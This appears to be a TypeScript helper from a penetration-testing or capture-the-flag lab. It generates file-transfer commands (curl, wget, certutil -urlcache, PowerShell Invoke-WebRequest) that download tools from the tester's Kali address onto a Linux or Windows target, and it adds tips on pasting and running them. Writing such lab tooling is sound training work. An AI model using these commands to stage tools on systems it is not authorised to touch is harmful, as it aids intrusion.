export type TransferOs = "linux" | "windows";
export type TransferClient = "curl" | "wget" | "certutil" | "iwr";

const CLIENTS: Record<TransferOs, TransferClient[]> = {
  linux: ["curl", "wget"],
  windows: ["certutil", "iwr"],
};

function hostOk(value: string): boolean {
  if (/^(?:\d{1,3}\.){3}\d{1,3}$/.test(value)) return value.split(".").every((part) => Number(part) <= 255);
  return /^[A-Za-z0-9][A-Za-z0-9.-]{0,80}$/.test(value);
}

function baseName(name: string): string | null {
  const base = name.split("/").pop() ?? "";
  if (!/^[A-Za-z0-9][A-Za-z0-9._-]{0,80}$/.test(base)) return null;
  return base;
}

export function transferPlan(input: {
  host: string;
  port: string;
  file: string;
  os: TransferOs;
  client: TransferClient;
}): { command: string; url: string; why: string } | { error: string } {
  const host = input.host.trim();
  const file = input.file.trim();
  if (!host) return { error: "The address is your tun0 address. 127.0.0.1 is this desk, and the target cannot reach it." };
  if (host === "127.0.0.1" || host === "localhost" || host === "0.0.0.0" || host.startsWith("127.")) {
    return { error: "That address is this desk. The target cannot reach it. Use the tun0 address from ip a." };
  }
  if (!hostOk(host)) return { error: "The address is one IP or one host name." };
  if (!/^\d{1,5}$/.test(input.port) || Number(input.port) < 1 || Number(input.port) > 65535) {
    return { error: "The port is the one the desk is listening on, usually 8080." };
  }
  const base = baseName(file);
  if (!base) return { error: "Pick a file in the uploads folder. The name is letters, numbers, dots, and hyphens." };
  if (!CLIENTS[input.os].includes(input.client)) return { error: "That client does not belong to this operating system." };
  const path = file
    .split("/")
    .map((part) => encodeURIComponent(part))
    .join("/");
  const url = `http://${host}:${input.port}/files/${path}`;
  const command =
    input.client === "curl"
      ? `curl -o /tmp/${base} ${url}`
      : input.client === "wget"
        ? `wget ${url} -O /tmp/${base}`
        : input.client === "certutil"
          ? `certutil -urlcache -split -f ${url} C:\\Users\\Public\\${base}`
          : `powershell -c "Invoke-WebRequest ${url} -OutFile C:\\Users\\Public\\${base}"`;
  return {
    command,
    url,
    why:
      input.os === "windows"
        ? "Paste this on the Windows host. certutil -urlcache -split -f fetches the URL into that path. IWR is Invoke-WebRequest, and -OutFile is the same save. Then dir the file and compare the size with Kali. A few hundred bytes is an HTML page, not the tool."
        : "Paste this on the Linux host. curl -o and wget -O both write the response to /tmp. Then ls -l on both sides. The sizes match, or the file is an error page. chmod +x only if you are about to run a binary.",
  };
}
